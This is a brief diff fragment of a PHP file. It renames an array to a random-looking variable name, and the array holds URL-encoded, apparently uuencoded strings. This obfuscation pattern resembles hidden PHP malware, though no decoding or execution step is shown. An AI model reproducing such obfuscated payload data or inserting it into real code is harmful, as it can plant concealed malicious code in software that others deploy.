@@ -1,6 +1,6 @@
 <?php
 
-$daarray = array(
+$aokolonalexi = array(
 "%2C8FU6%2CTE%28%3B%279C%3B7%2C%5D%0A%60%0A",
 "09%23%29%26%3EF%25%27%3B%275%3A%2CU%29V8F%3C%5D%2F0%60%60%0A%60%0A",
 "%286D%3D%26%3CV%29%271GH%60%0A%60%0A",
